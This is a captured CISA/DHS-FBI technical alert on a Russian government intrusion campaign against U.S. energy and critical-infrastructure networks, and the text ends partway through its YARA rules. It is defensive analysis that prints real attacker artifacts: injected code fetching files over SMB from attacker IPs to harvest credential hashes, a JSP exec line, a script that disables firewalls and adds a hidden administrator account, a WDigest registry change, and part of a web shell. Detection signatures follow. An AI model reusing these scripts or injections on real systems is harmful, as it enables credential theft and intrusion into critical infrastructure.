{
    "title": "russian government cyber activity targeting energy and other critical infrastructure sectors _ cisa",
    "text": "Official website of the Department of Homeland Security\nHome    Site Map    FAQ    Contact Us    Traffic Light Protocol    PCII    Accountability    Disclaimer    Privacy Policy    FOIA    No Fear Act    Accessibility Plain Writing Plug-\nins    Inspector General    The White House    USA.gov\n \nCISA is part of the Department of Homeland Security\nAbout Us Alerts and Tips Resources Industrial Control Systems Report\nNational Cyber Awareness System  > Alerts  > Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors\nMore AlertsAlert (TA18-074A)\nRussian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors\nOriginal release date: March 15, 2018 | Last revised : March 16, 2018\nSystems Affected\nDomain Controllers\nFile Servers\nEmail Servers\nOverview\nThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert\nprovides information on Russian government actions targeting U.S. Government entities as well as organizations in the energy, nuclear, commercial facilities, water,\naviation, and critical manufacturing sectors. It also contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used\nby Russian government cyber actors on compromised victim networks. DHS and FBI produced this alert to educate network defenders to enhance their ability to identify\nand reduce exposure to malicious activity.\nDHS and FBI characterize this activity as a multi-stage intrusion campaign by Russian government cyber actors who targeted small commercial facilities’ networks where\nthey staged malware, conducted spear phishing, and gained remote access into energy sector networks. After obtaining access, the Russian government cyber actors\nconducted network reconnaissance, moved laterally, and collected information pertaining to Industrial Control Systems (ICS).\nFor a downloadable copy of IOC packages and associated files, see:\nTA18-074A_TLP_WHITE.csv\nTA18-074A_TLP_WHITE.stix.xml\nMIFR-10127623_TLP_WHITE.pdf\nMIFR-10127623_TLP_WHITE_stix.xml\nMIFR-10128327_TLP_WHITE.pdf\nMIFR-10128327_TLP_WHITE_stix.xml\nMIFR-10128336_TLP_WHITE.pdf\nMIFR-10128336_TLP_WHITE_stix.xml\nMIFR-10128830 ​_TLP_WHITE.pdf\nMIFR-10128830 ​_TLP_WHITE_stix.xml\nMIFR-10128883_TLP_WHITE.pdf\nMIFR-10128883_TLP_WHITE_stix.xml\nMIFR-10135300_TLP_WHITE.pdf\nMIFR-10135300_TLP_WHITE_stix.xml\nContact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.\nDescription\nSince at least March 2016, Russian government cyber actors—hereafter referred to as “threat actors”—targeted government entities and multiple U.S. critical\ninfrastructure sectors, including the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors.\nAnalysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors related to this activity. Of note, the report Dragonfly: Western energy sector\ntargeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. [1]\nThis campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third-party\nsuppliers with less secure networks, referred to as “staging targets” throughout this alert. The threat actors used the staging targets’ networks as pivot points and\nmalware repositories when targeting their final intended victims. NCCIC and FBI judge the ultimate objective of the actors is to compromise organizational networks, also\nreferred to as the “intended target.”\nTechnical Details\nThe threat actors in this campaign employed a variety of TTPs, including\nspear-phishing emails (from compromised legitimate account),\nwatering-hole domains,\ncredential gathering,\nopen-source and network reconnaissance,\nhost-based exploitation, and\ntargeting industrial control system (ICS) infrastructure.\nUsing Cyber Kill Chain for Analysis\nDHS used the Lockheed-Martin Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance,\nweaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of threat actors’\nactivities within this framework.\n \nStage 1: Reconnaissance\nThe threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting\nrelationships with many of the intended targets. DHS analysis identified the threat actors accessing publicly available information hosted by organization-monitored\nnetworks during the reconnaissance phase. Based on forensic analysis, DHS assesses the threat actors sought information on network and organizational design and\ncontrol system capabilities within organizations. These tactics are commonly used to collect the information needed for targeted spear-phishing attempts. In some cases,\ninformation posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the\nthreat actors downloaded a small photo from a publicly accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control\nsystems equipment models and status information in the background.\nAnalysis also revealed that the threat actors used compromised staging targets to download the source code for several intended targets’ websites. Additionally, the threat\nactors attempted to remotely access infrastructure such as corporate web-based email and virtual private network (VPN) connections.\n \nStage 2: Weaponization\nSpear-Phishing Email TTPs\nThroughout the spear-phishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a\nremote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//<remote IP address>/Normal.dotm). As a part of the standard\nprocesses executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the\nrequested file. (Note: transfer of credentials can occur even if the file is not retrieved.) After obtaining a credential hash, the threat actors can use password-cracking\ntechniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use single-factor\nauthentication. [2]\n \nUse of Watering Hole Domains\nOne of the threat actors’ primary uses for staging targets was to develop watering holes. Threat actors compromised the infrastructure of trusted organizations to reach\nintended targets. [3] Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical\ninfrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and\nreference malicious content. The threat actors used legitimate credentials to access and directly modify the website content. The threat actors modified these websites by\naltering JavaScript and PHP files to request a file icon using SMB from an IP address controlled by the threat actors. This request accomplishes a similar technique\nobserved in the spear-phishing documents for credential harvesting. In one instance, the threat actors added a line of code into the file “header.php”, a legitimate PHP file\nthat carried out the redirected traffic.\n \n<img src=\"file[:]//62.8.193[.]206/main_logo.png\" style=\"height: 1px; width: 1px;\" />\n \nIn another instance, the threat actors modified the JavaScript file, “modernizr.js”, a legitimate JavaScript library used by the website to detect various aspects of the user’s\nbrowser. The file was modified to contain the contents below:\n \nvar i = document.createElement(\"img\");\ni.src = \"file[:]//184.154.150[.]66/ame_icon.png\";\ni.width = 3;\ni.height=2;\n \n \nStage 3: Delivery\nWhen compromising staging target networks, the threat actors used spear-phishing emails that differed from previously reported TTPs. The spear-phishing emails used a\ngeneric contract agreement theme (with the subject line “AGREEMENT & Confidential”) and contained a generic PDF document titled ``document.pdf. (Note the inclusion\nof two single back ticks at the beginning of the attachment name.) The PDF was not malicious and did not contain any active code. The document contained a shortened\nURL that, when clicked, led users to a website that prompted the user for email address and password. (Note: no code within the PDF initiated a download.)\nIn previous reporting, DHS and FBI noted that all of these spear-phishing emails referred to control systems or process control systems. The threat actors continued using\nthese themes specifically against intended target organizations. Email messages included references to common industrial control equipment and protocols. The emails\nused malicious Microsoft Word attachments that appeared to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, and invitations and\npolicy documents to entice the user to open the attachment.\n \nStage 4: Exploitation\nThe threat actors used distinct and unusual TTPs in the phishing campaign directed at staging targets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link,\nwhich redirected to http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website\ncontained input fields for an email address and password mimicking a login page for a website.\nWhen exploiting the intended targets, the threat actors used malicious .docx files to capture user credentials. The documents retrieved a file through a “file://” connection\nover SMB using Transmission Control Protocol (TCP) ports 445 or 139. This connection is made to a command and control (C2) server—either a server owned by the threat\nactors or that of a victim. When a user attempted to authenticate to the domain, the C2 server was provided with the hash of the password. Local users received a graphical\nuser interface (GUI) prompt to enter a username and password, and the C2 received this information over TCP ports 445 or 139. (Note: a file transfer is not necessary for a\nloss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. [1]\n \nStage 5: Installation\nThe threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication was not used. [4] To maintain persistence, the threat\nactors created local administrator accounts within staging targets and placed malicious files within intended targets.\n \nEstablishing Local Accounts\nThe threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script “symantec_help.jsp” contained a one-line\nreference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in “C:\\Program\nFiles (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\”.\n \nContents of symantec_help.jsp\n____________________________________________________________________________________________________________________\n<% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\<enu.cmd>\\\"\"); %>\n____________________________________________________________________________________________________________________\nThe script “enu.cmd” created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The\nscript then attempted to add the newly created account to the administrators group to gain elevated privileges. This script contained hard-coded values for the group\nname “administrator” in Spanish, Italian, German, French, and English.\n \nContents of enu.cmd\n____________________________________________________________________________________________________________________\nnetsh firewall set opmode disable\nnetsh advfirewall set allprofiles state off\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d\n\"3389:TCP:*:Enabled:Remote Desktop\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d\n\"3389:TCP:*:Enabled:Remote Desktop\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v MaxInstanceCount /t REG_DWORD /d 100 /f\nnet user MS_BACKUP <Redacted_Password> /add\nnet localgroup Administrators /add MS_BACKUP\nnet localgroup Administradores /add MS_BACKUP\nnet localgroup Amministratori /add MS_BACKUP\nnet localgroup Administratoren /add MS_BACKUP\nnet localgroup Administrateurs /add MS_BACKUP\nnet localgroup \"Remote Desktop Users\" /add MS_BACKUP\nnet user MS_BACKUP /expires:never\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v MS_BACKUP /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\nsc config termservice start= auto\nnet start termservice\n____________________________________________________________________________________________________________________\nDHS observed the threat actors using this and similar scripts to create multiple accounts within staging target networks. Each account created by the threat actors served a\nspecific purpose in their operation. These purposes ranged from the creation of additional accounts to cleanup of activity. DHS and FBI observed the following actions\ntaken after the creation of these local accounts:\nAccount 1 : Account 1 was named to mimic backup services of the staging target. This account was created by the malicious script described earlier. The threat actor used\nthis account to conduct open-source reconnaissance and remotely access intended targets.\nAccount 2 : Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.\nAccount 3 : Account 3 was created within the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat\nactor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated\nwith the last name).\nAccount 4 : In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete\nlogs and cover tracks.\n \nScheduled Task\nIn addition, the threat actors created a scheduled task named reset , which was designed to automatically log out of their newly created account every eight hours.\n \nVPN Software\nAfter achieving access to staging targets, the threat actors installed tools to carry out operations against intended victims. On one occasion, threat actors installed the free\nversion of FortiClient, which they presumably used as a VPN client to connect to intended target networks.\n \nPassword Cracking Tools\nConsistent with the perceived goal of credential harvesting, the threat actors dropped and executed open source and free tools such as Hydra, SecretsDump, and\nCrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub.\nForensic analysis indicates that many of these tools were executed during the timeframe in which the actor was accessing the system. Of note, the threat actors installed\nPython 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\<Redacted Username>\\Desktop\\OWAExchange\\.\n \nDownloader\nOnce inside of an intended target’s network, the threat actor downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and\nwere renamed to the appropriate extension, typically .exe or .zip.\nIn one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:\nThe threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.\nThe files were renamed to new extensions, with INST.txt being renamed INST.exe.\nThe files were executed on the host and then immediately deleted.\nThe execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of the compromised system of an\nintended target.\nThe registry value “ntdll” was added to the “HKEY_USERS\\<USER SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” key.\n \nPersistence Through .LNK File Manipulation\nThe threat actors manipulated LNK files, commonly known as a Microsoft Window’s shortcut file, to repeatedly gather user credentials. Default Windows functionality\nenables icons to be loaded from a local or remote Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to a remote\nserver controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process,\nthe active user’s credentials are passed through the attempted SMB connection.\nFour of the observed LNK files were “SETROUTE.lnk”, “notepad.exe.lnk”, “Document.lnk” and “desktop.ini.lnk”. These names appeared to be contextual, and the threat\nactor may use a variety of other file names while using this tactic. Two of the remote servers observed in the icon path of these LNK files were 62.8.193[.]206 and\n5.153.58[.]45. Below is the parsed content of one of the LNK files:\nParsed output for file: desktop.ini.lnk\nRegistry Modification\nThe threat actor would modify key systems to store plaintext credentials in memory. In one instance, the threat actor executed the following command.\n \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f\n \nStage 6: Command and Control\nThe threat actors commonly created web shells on the intended targets’ publicly accessible email and web servers. The threat actors used three different filenames\n(“global.aspx, autodiscover.aspx and index.aspx) for two different webshells. The difference between the two groups was the “public string Password” field.\n \nBeginning Contents of the Web Shell\n____________________________________________________________________________________________________________________\n<%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" EnableViewStateMac=\"false\" EnableViewState=\"true\"%>\n<%@ import Namespace=\"System\"%>\n<%@ import Namespace=\"System.IO\"%>\n<%@ import Namespace=\"System.Diagnostics\"%>\n<%@ import Namespace=\"System.Data\"%>\n<%@ import Namespace=\"System.Management\"%>\n<%@ import Namespace=\"System.Data.OleDb\"%>\n<%@ import Namespace=\"Microsoft.Win32\"%>\n<%@ import Namespace=\"System.Net.Sockets\" %>\n<%@ import Namespace=\"System.Net\" %>\n<%@ import Namespace=\"System.Runtime.InteropServices\"%>\n<%@ import Namespace=\"System.DirectoryServices\"%>\n<%@ import Namespace=\"System.ServiceProcess\"%>\n<%@ import Namespace=\"System.Text.RegularExpressions\"%>\n<%@ Import Namespace=\"System.Threading\"%>\n<%@ Import Namespace=\"System.Data.SqlClient\"%>\n<%@ import Namespace=\"Microsoft.VisualBasic\"%>\n<%@ Import Namespace=\"System.IO.Compression\" %>\n<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<script runat = \"server\">\npublic string Password = \"<REDACTED>\";\npublic string z_progname = \"z_WebShell\";\n…\n____________________________________________________________________________________________________________________\n \nStage 7: Actions on Objectives\nDHS and FBI identified the threat actors leveraging remote access services and infrastructure such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the\ninfrastructure of staging targets to connect to several intended targets.\n \nInternal Reconnaissance\nUpon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. DHS observed the threat actors focusing on\nidentifying and browsing file servers within the intended victim’s network.\nOnce on the intended target’s network, the threat actors used privileged credentials to access the victim’s domain controller typically via RDP. Once on the domain\ncontroller, the threat actors used the batch scripts “dc.bat” and “dit.bat” to enumerate hosts, users, and additional information about the environment. The observed\noutputs (text documents) from these scripts were:\nadmins.txt\ncompleted_dclist.txt\ncompleted_trusts.txt\ncompleted_zone.txt\ncomps.txt\nconditional_forwarders.txt\ndomain_zone.txt\nenum_zones.txt\nusers.txt\nThe threat actors also collected the files “ntds.dit” and the “SYSTEM” registry hive. DHS observed the threat actors compress all of these files into archives named\n“SYSTEM.zip” and “comps.zip”.\nThe threat actors used Windows’ scheduled task and batch scripts to execute “scr.exe” and collect additional information from hosts on the network. The tool “scr.exe” is\na screenshot utility that the threat actor used to capture the screen of systems across the network. The MD5 hash of “scr.exe” matched the MD5 of ScreenUtil, as reported\nin the Symantec Dragonfly 2.0 report.\nIn at least two instances, the threat actors used batch scripts labeled “pss.bat” and “psc.bat” to run the PsExec tool. Additionally, the threat actors would rename the tool\nPsExec to “ps.exe”.\n1. The batch script (“pss.bat” or “psc.bat”) is executed with domain administrator credentials.\n2. The directory “out” is created in the user’s %AppData% folder.\n3. PsExec is used to execute “scr.exe” across the network and to collect screenshots of systems in “ip.txt”.\n4. The screenshot’s filename is labeled based on the computer name of the host and stored in the target’s C:\\Windows\\Temp directory with a “.jpg” extension.\n5. The screenshot is then copied over to the newly created “out” directory of the system where the batch script was executed.\n6. In one instance, DHS observed an “out.zip” file created.\nDHS observed the threat actors create and modify a text document labeled “ip.txt” which is believed to have contained a list of host information. The threat actors used\n“ip.txt” as a source of hosts to perform additional reconnaissance efforts. In addition, the text documents “res.txt” and “err.txt” were observed being created as a result of\nthe batch scripts being executed. In one instance, “res.txt” contained output from the Windows’ command “query user” across the network.\n \nUsing <Username> <Password>\nRunning -s cmd /c query user on <Hostname1>\nRunning -s cmd /c query user on <Hostname2>\nRunning -s cmd /c query user on <Hostname3>\nUSERNAME     SESSIONNAME       ID    STATE    IDLE TIME      LOGON TIME\n<user1>                                              2       Disc       1+19:34         6/27/2017 12:35 PM\n \nAn additional batch script named “dirsb.bat” was used to gather folder and file names from hosts on the network.\nIn addition to the batch scripts, the threat actors also used scheduled tasks to collect screenshots with “scr.exe”. In two instances, the scheduled tasks were designed to\nrun the command “C:\\Windows\\Temp\\scr.exe” with the argument “C:\\Windows\\Temp\\scr.jpg”. In another instance, the scheduled task was designed to run with the\nargument “pss.bat” from the local administrator’s “AppData\\Local\\Microsoft\\” folder.\nThe threat actors commonly executed files out of various directories within the user’s AppData or Downloads folder. Some common directory names were\nChromex64,\nMicrosoft_Corporation,\nNT,\nOffice365,\nTemp, and\nUpdate.\n \nTargeting of ICS and SCADA Infrastructure\nIn multiple instances, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy\ngeneration facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. Based on DHS analysis of existing\ncompromises, these files were named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or\n“SCADA PANEL LAYOUTS.xlsx”).\nThe threat actors targeted and copied profile and configuration information for accessing ICS systems on the network. DHS observed the threat actors copying Virtual\nNetwork Connection (VNC) profiles that contained configuration information on accessing ICS systems. DHS was able to reconstruct screenshot fragments of a Human\nMachine Interface (HMI) that the threat actors accessed.\n \nCleanup and Cover Tracks\nIn multiple instances, the threat actors created new accounts on the staging targets to perform cleanup operations. The accounts created were used to clear the following\nWindows event logs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also removed applications they installed while they were in the\nnetwork along with any logs produced. For example, the Fortinet client installed at one commercial facility was deleted along with the logs that were produced from its use.\nFinally, data generated by other accounts used on the systems accessed were deleted.\nThreat actors cleaned up intended target networks through deleting created screenshots and specific registry keys. Through forensic analysis, DHS determined that the\nthreat actors deleted the registry key associated with terminal server client that tracks connections made to remote systems. The threat actors also deleted all batch\nscripts, output text documents and any tools they brought into the environment such as “scr.exe”.\n \nDetection and Response\nIOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP\naddresses, domain names, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlists to determine whether malicious activity has been\nobserved within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these threat actors.\n \nNetwork Signatures and Host-Based Rules\nThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actor TTPs. Although these network\nsignatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.\n \nNetwork Signatures\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1;\nflow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)\n___________________________________\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server;\ncontent:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)\n________________________________________\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server;\ncontent:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)\n_________________________________________\nalert tcp any any -> any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server;\ncontent:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7;\nfast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)\n________________________________________\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1;\nflow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service\nhttp;)\n_________________________________________\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1;\nflow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]\n{3}=[a-z0-9]{32}&/U\"; classtype:bad-unknown; metadata:service http;)\n__________________________________________\nalert tcp $EXTERNAL_NET [139,445] -> $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1;\nflow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-\nssn;)\n \nYARA Rules\nThis is a consolidated rule set for malware associated with this activity. These rules were written by NCCIC and include contributions from trusted partners.\n*/\n \nrule APT_malware_1\n{\nmeta:\n            description = \"inveigh pen testing tools & related artifacts\"\n            author = \"DHS | NCCIC Code Analysis Team\"    \n            date = \"2017/07/17\"\n            hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"\n            hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"\n            hash2 = \"BA756DD64C1147515BA2298B6A760260\"\n            hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"\n            hash4 = \"04738CA02F59A5CD394998A99FCD9613\"\n            hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"\n            hash6 = \"65A1A73253F04354886F375B59550B46\"\n            hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"\n            hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"\n            hash9 = \"722154A36F32BA10E98020A8AD758A7A\"\n            hash10 = \"4595DBE00A538DF127E0079294C87DA0\"\nstrings:\n            $s0 = \"file://\"\n            $s1 = \"/ame_icon.png\"\n            $s2 = \"184.154.150.66\"\n            $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }\n            $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }\n            $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"\n            $s6 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n            $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"\n            $s8 = \"NlZzSZk=\"\n            $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"\n            $s10 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n            $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"\n            $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"\n            $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }\n            $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }\n            $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }\n//inveigh pentesting tools\n            $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }\n//specific malicious word document PK archive\n            $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }\n            $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }\n            $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }\n            $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n            $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n            $s22 = \"5.153.58.45\"\n            $s23 = \"62.8.193.206\"\n            $s24 = \"/1/ree_stat/p\"\n            $s25 = \"/icon.png\"\n            $s26 = \"/pshare1/icon\"\n            $s27 = \"/notepad.png\"\n            $s28 = \"/pic.png\"\n            $s29 = \"http://bit.ly/2m0x8IH\"\n           \ncondition:\n            ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or\n($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)\n}\n \n \n \nrule APT_malware_2\n{\nmeta:\n      description = \"rule detects malware\"\n      author = \"other\"\n \nstrings:\n      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }\n      $http_push = \"X-mode: push\" nocase\n      $http_pop = \"X-mode: pop\" nocase\n \ncondition:\n      any of them\n}\n \n \n \nrule Query_XML_Code_MAL_DOC_PT_2\n{\nmeta:\n     name= \"Query_XML_Code_MAL_DOC_PT_2\"\n     author = \"other\"\n \nstrings:\n \n            $zip_magic = { 50 4b 03 04 }\n            $dir1 = \"word/_rels/settings.xml.rels\"\n            $bytes = {8c 90 cd 4e eb 30 10 85 d7}\n \ncondition:\n            $zip_magic at 0 and $dir1 and $bytes\n}\n \n \n \nrule Query_Javascript_Decode_Function\n{\nmeta:\n      name= \"Query_Javascript_Decode_Function\"\n      author = \"other\"\n \nstrings:\n      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}\n      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30\n31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}\n      $decode3 = {3D ?? 